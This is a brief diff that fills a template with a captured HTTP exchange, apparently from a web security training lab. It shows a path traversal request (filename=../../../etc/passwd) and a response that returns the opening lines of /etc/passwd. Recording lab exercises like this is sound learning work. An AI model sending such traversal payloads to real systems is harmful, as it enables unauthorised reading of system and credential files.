@@ -1,1 +1,16 @@
-=== Paste raw HTTP request/response here (that returns /etc/passwd or target file) ===
+-- Request --
+GET /image?filename=../../../etc/passwd HTTP/2
+Host: <lab-host.web-security-academy.net
+Cookie: session=<redacted>
+
+
+
+-- Response --
+HTTP/2 200 OK
+Content-Type: image/jpeg
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2316
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
